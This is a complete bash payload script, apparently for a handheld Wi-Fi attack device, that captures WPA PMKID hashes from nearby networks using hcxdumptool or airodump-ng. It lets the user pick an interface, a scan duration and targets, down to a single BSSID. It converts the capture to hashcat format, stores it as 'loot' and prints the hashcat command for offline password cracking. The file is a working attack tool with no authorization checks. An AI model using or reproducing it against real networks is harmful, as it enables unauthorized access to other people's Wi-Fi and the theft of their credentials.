#!/bin/bash
# Title: NullSec PMKID Capture
# Author: bad-antics
# Description: Capture PMKID hashes without client deauthentication
# Category: nullsec

LOOT_DIR="/mmc/nullsec"
mkdir -p "$LOOT_DIR"/{pmkid,logs}

# --- BRIEFING ---
PROMPT "NULLSEC PMKID CAPTURE

Clientless WPA attack:
- No deauthentication
- Works on WPA2/WPA3
- Passive collection

Captures PMKID hashes for
offline cracking.

Press OK to configure."

# --- INTERFACE CHECK ---
ALL_IFS=$(ls /sys/class/net 2>/dev/null | grep -E "wlan|mon")

if [ -z "$ALL_IFS" ]; then
    PROMPT "ERROR: No wireless
interface found!

Connect a wireless adapter
and try again."
    exit 1
fi

IFACE_LIST=""
count=1
for iface in $ALL_IFS; do
    IFACE_LIST="${IFACE_LIST}${count}: ${iface}
"
    count=$((count + 1))
done

LIST "SELECT INTERFACE

$IFACE_LIST" IFACE_SEL

IFACE=$(echo "$ALL_IFS" | sed -n "${IFACE_SEL}p")
[ -z "$IFACE" ] && IFACE="wlan1mon"

# --- SCAN MODE ---
LIST "CAPTURE MODE

1: Quick Scan (30s)
2: Standard Scan (2 min)
3: Deep Scan (5 min)
4: Marathon (15 min)
5: Continuous (manual stop)" MODE_SEL

case $MODE_SEL in
    1) DURATION=30 ;;
    2) DURATION=120 ;;
    3) DURATION=300 ;;
    4) DURATION=900 ;;
    5) DURATION=0 ;;
    *) DURATION=120 ;;
esac

# --- FILTER OPTIONS ---
LIST "TARGET FILTER

1: All Networks
2: WPA2 Only
3: WPA3 Only
4: Strong Signal (-70+)
5: Specific BSSID" FILTER_SEL

if [ "$FILTER_SEL" = "5" ]; then
    KEYBOARD "ENTER BSSID" 17 TARGET_BSSID
fi

# --- CONFIRMATION ---
PROMPT "PMKID CAPTURE READY

Interface: $IFACE
Duration: $((DURATION/60)) min
Filter: $FILTER_SEL

This is a passive attack.
No clients will be affected.

Press OK to START."

# --- EXECUTE CAPTURE ---
SCREEN "PMKID SCANNING" "Listening for PMKIDs..." 3
LED M SLOW

CAPTURE_FILE="$LOOT_DIR/pmkid/pmkid_$(date +%Y%m%d_%H%M%S)"
PMKID_COUNT=0

# Check for hcxdumptool (preferred)
if command -v hcxdumptool >/dev/null 2>&1; then
    SCREEN "USING hcxdumptool" "Best PMKID capture tool" 2
    
    FILTER_OPTS=""
    case $FILTER_SEL in
        2) FILTER_OPTS="--filtermode=2" ;;
        3) FILTER_OPTS="--filtermode=3" ;;
        4) FILTER_OPTS="--filterlist_ap=/tmp/strong_aps.txt" ;;
        5) echo "$TARGET_BSSID" > /tmp/target_ap.txt; FILTER_OPTS="--filterlist_ap=/tmp/target_ap.txt --filtermode=2" ;;
    esac
    
    if [ "$DURATION" -gt 0 ]; then
        timeout $DURATION hcxdumptool -i "$IFACE" -o "${CAPTURE_FILE}.pcapng" --enable_status=1 $FILTER_OPTS 2>/dev/null &
        CAPTURE_PID=$!
        
        # Monitor progress
        while kill -0 $CAPTURE_PID 2>/dev/null; do
            if [ -f "${CAPTURE_FILE}.pcapng" ]; then
                SIZE=$(stat -c%s "${CAPTURE_FILE}.pcapng" 2>/dev/null || echo 0)
                SCREEN "CAPTURING..." "File size: ${SIZE} bytes" 2
            fi
            sleep 5
        done
    else
        hcxdumptool -i "$IFACE" -o "${CAPTURE_FILE}.pcapng" --enable_status=1 $FILTER_OPTS 2>/dev/null &
        CAPTURE_PID=$!
        
        PROMPT "CAPTURE RUNNING

Press OK to stop capture."
        
        kill $CAPTURE_PID 2>/dev/null
    fi
    
    # Convert to hashcat format
    SCREEN "CONVERTING..." "Creating hashcat file..." 2
    if command -v hcxpcapngtool >/dev/null 2>&1; then
        hcxpcapngtool -o "${CAPTURE_FILE}.22000" "${CAPTURE_FILE}.pcapng" 2>/dev/null
        PMKID_COUNT=$(wc -l < "${CAPTURE_FILE}.22000" 2>/dev/null || echo 0)
    fi
    
else
    # Fallback to airodump-ng
    SCREEN "USING airodump-ng" "Basic PMKID capture" 2
    
    if [ "$DURATION" -gt 0 ]; then
        timeout $DURATION airodump-ng "$IFACE" -w "$CAPTURE_FILE" --output-format pcap 2>/dev/null &
        CAPTURE_PID=$!
        
        while kill -0 $CAPTURE_PID 2>/dev/null; do
            if [ -f "${CAPTURE_FILE}-01.cap" ]; then
                CAP_SIZE=$(stat -c%s "${CAPTURE_FILE}-01.cap" 2>/dev/null || echo 0)
                SCREEN "CAPTURING..." "Cap size: ${CAP_SIZE} bytes" 2
            fi
            sleep 5
        done
    else
        airodump-ng "$IFACE" -w "$CAPTURE_FILE" --output-format pcap 2>/dev/null &
        CAPTURE_PID=$!
        
        PROMPT "CAPTURE RUNNING

Press OK to stop capture."
        
        kill $CAPTURE_PID 2>/dev/null
    fi
    
    # Try to extract PMKIDs
    if command -v hcxpcapngtool >/dev/null 2>&1 && [ -f "${CAPTURE_FILE}-01.cap" ]; then
        hcxpcapngtool -o "${CAPTURE_FILE}.22000" "${CAPTURE_FILE}-01.cap" 2>/dev/null
        PMKID_COUNT=$(wc -l < "${CAPTURE_FILE}.22000" 2>/dev/null || echo 0)
    fi
fi

killall hcxdumptool airodump-ng 2>/dev/null

# --- RESULTS ---
LED G SOLID

TOTAL_FILES=$(ls "$LOOT_DIR/pmkid"/*.22000 2>/dev/null | wc -l || echo 0)
TOTAL_PMKIDS=$(cat "$LOOT_DIR/pmkid"/*.22000 2>/dev/null | wc -l || echo 0)

PROMPT "PMKID CAPTURE COMPLETE

This Session: $PMKID_COUNT
Total Files: $TOTAL_FILES
Total PMKIDs: $TOTAL_PMKIDS

Saved to:
$LOOT_DIR/pmkid/

Crack with:
hashcat -m 22000 file.22000
wordlist.txt

Press OK to continue."

# --- SHOW CAPTURED ---
if [ "$PMKID_COUNT" -gt 0 ]; then
    LIST "VIEW RESULTS?

1: Show captured PMKIDs
2: Copy to USB
3: Exit" VIEW_SEL
    
    if [ "$VIEW_SEL" = "1" ]; then
        PMKID_DATA=$(head -5 "${CAPTURE_FILE}.22000" 2>/dev/null)
        PROMPT "CAPTURED PMKIDs:

$PMKID_DATA

(showing first 5)"
    elif [ "$VIEW_SEL" = "2" ]; then
        if [ -d "/mmc/usb" ]; then
            cp "$LOOT_DIR/pmkid"/*.22000 /mmc/usb/ 2>/dev/null
            PROMPT "Copied to USB!"
        else
            PROMPT "No USB detected."
        fi
    fi
fi

LED OFF
